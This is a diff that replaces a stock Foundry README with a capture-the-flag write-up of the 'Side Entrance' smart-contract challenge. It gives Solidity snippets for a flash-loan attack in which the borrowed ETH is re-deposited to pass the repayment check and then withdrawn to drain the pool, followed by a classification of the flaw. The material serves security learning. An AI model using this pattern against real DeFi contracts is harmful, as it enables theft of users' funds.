@@ -1,66 +1,62 @@
-## Foundry
+# Side Entrance
 
-**Foundry is a blazing fast, portable and modular toolkit for Ethereum application development written in Rust.**
+## Challenge
 
-Foundry consists of:
+A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
 
--   **Forge**: Ethereum testing framework (like Truffle, Hardhat and DappTools).
--   **Cast**: Swiss army knife for interacting with EVM smart contracts, sending transactions and getting chain data.
--   **Anvil**: Local Ethereum node, akin to Ganache, Hardhat Network.
--   **Chisel**: Fast, utilitarian, and verbose solidity REPL.
+It has 1000 ETH in balance already, and is offering free flashloans using the deposited ETH to promote their system.
 
-## Documentation
+You start with 1 ETH in balance. Pass the challenge by rescuing all ETH from the pool and depositing it in the designated recovery account.
 
-https://book.getfoundry.sh/
+## Solution
 
-## Usage
+To exploit the vulnerability,I created an attack contract to inherit the execute function from the interface.
 
-### Build
-
-```shell
-$ forge build
+```
+contract Attacker is IFlashLoanEtherReceiver
 ```
 
-### Test
+Then I called the flashLoan function from the attack contract and borrowed all the ETH in the pool contract,which in turn called the execute function of the interface.I used this to deposit some ETH into the pool.
 
-```shell
-$ forge test
+```
+function execute() external payable override {
+        require(msg.sender == address(pool), "Only pool can call this function");
+
+        pool.deposit{value: ETHER_IN_POOL}();
+    }
 ```
 
-### Format
+This check would pass because the amount I borrowed is what I deposited.
 
-```shell
-$ forge fmt
+```
+if (address(this).balance < balanceBefore) {
+            revert RepayFailed();
+        }
 ```
 
-### Gas Snapshots
+Then I can withdraw from the pool and transfer to the recovery account,since address has been added to the mapping from the deposit function.
 
-```shell
-$ forge snapshot
+```
+function withdraw() public {
+        pool.withdraw();
+        (bool success,) = payable(recovery).call{value:ETHER_IN_POOL}("");
+        require(success,"call failed");
+    }
 ```
 
-### Anvil
+![Alt text](images/side-entrance.png)
 
-```shell
-$ anvil
-```
+## Attack Classification
 
-### Deploy
+### Economic Exploit
+The attacker economically exploited the pool by borrowing and "recycling" ETH without providing real collateral, thereby draining the pool's entire balance.
 
-```shell
-$ forge script script/Counter.s.sol:CounterScript --rpc-url <your_rpc_url> --private-key <your_private_key>
-```
+### Access Control Misconfiguration
+The vulnerability lies in poor access control. The pool allowed sensitive operations (like deposits and withdrawals) to be executed by untrusted borrowers, enabling unauthorized draining of funds.
 
-### Cast
+### State Manipulation
+The attacker leveraged state manipulation by temporarily increasing their "deposit balance" through a flash loan, allowing withdrawal of funds they never truly owned.
 
-```shell
-$ cast <subcommand>
-```
+### DoS (Denial of Service)
+By draining all funds from the pool, the attacker rendered the pool inoperable for other users who might want to access flash loans or make legitimate deposits.
 
-### Help
-
-```shell
-$ forge --help
-$ anvil --help
-$ cast --help
-```
